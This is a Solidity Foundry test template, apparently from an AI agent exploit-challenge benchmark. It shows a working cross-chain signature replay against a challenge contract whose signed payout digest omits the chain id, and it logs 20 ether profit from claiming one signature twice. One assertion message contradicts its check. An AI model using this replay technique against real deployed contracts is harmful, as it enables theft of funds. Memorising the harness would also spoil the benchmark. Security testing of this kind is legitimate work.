// SPDX-License-Identifier: MIT
// AGENT-GENERATED harness: {{STRATEGY_ID}} on {{CHALLENGE_NAME}}.
// Technique: the payout digest binds (user, amount, nonce) but NOT the chain
// or the contract — the owner's signature for chain A collects the payout on
// chain B too.
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {LayerZeroSigReplay} from "../../src/challenges/LayerZeroSigReplay.sol";

contract {{TEST_CONTRACT}} is Test {
    function test_agentSolve() public {
        uint256 ownerPk = 0xA11CE;
        address ownerAddr = vm.addr(ownerPk);
        vm.deal(ownerAddr, 1000 ether);
        vm.prank(ownerAddr);
        LayerZeroSigReplay chainA = new LayerZeroSigReplay{value: 100 ether}();
        // Second instance under a DIFFERENT chainid — same owner, same code.
        uint256 originalChain = block.chainid;
        vm.chainId(137);
        vm.prank(ownerAddr);
        LayerZeroSigReplay chainB = new LayerZeroSigReplay{value: 100 ether}();
        vm.chainId(originalChain);

        // Owner signs ONCE (user=this, 10 ether, nonce 0): universal digest.
        bytes32 digest = keccak256(abi.encode(address(this), uint256(10 ether), uint256(0)));
        bytes32 prefixed = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", digest));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPk, prefixed);
        bytes memory sig = abi.encodePacked(r, s, v);

        uint256 beforeA = address(this).balance;
        chainA.claimPayout(10 ether, sig);
        assertEq(address(this).balance, beforeA + 10 ether, "chain A payout failed");

        vm.chainId(137);
        uint256 beforeB = address(this).balance;
        chainB.claimPayout(10 ether, sig);
        assertEq(address(this).balance, beforeB + 10 ether, "signature must not verify on chain B");
        vm.chainId(originalChain);
        console2.log("[PROFIT_WEI]", uint256(20 ether));
    }

    receive() external payable {}
}
